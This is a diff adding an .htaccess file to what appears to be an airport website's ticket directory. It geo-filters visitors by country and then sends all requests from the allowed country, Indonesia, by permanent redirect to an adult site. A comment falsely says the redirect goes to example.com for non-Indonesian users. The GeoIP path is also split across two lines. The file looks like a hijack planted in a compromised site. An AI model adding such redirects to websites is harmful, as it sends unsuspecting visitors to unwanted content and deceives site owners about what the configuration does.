@@ -1,0 +1,15 @@
+<IfModule mod_geoip.c>
+    GeoIPEnable On
+    GeoIPDBFile /home/u1447232/public_html/kalimarau-airport.com/tiket
+/GeoLite2-City.mmdb
+
+    # Block access from countries other than Indonesia (ID)
+    SetEnvIf GEOIP_COUNTRY_CODE ID AllowCountry
+    Deny from all
+    Allow from env=AllowCountry
+</IfModule>
+
+# Redirect users from non-Indonesia countries to example.com
+RewriteEngine On
+RewriteCond %{ENV:AllowCountry} !^$
+RewriteRule ^(.*)$ http://xnxx.com/$1 [L,R=301]
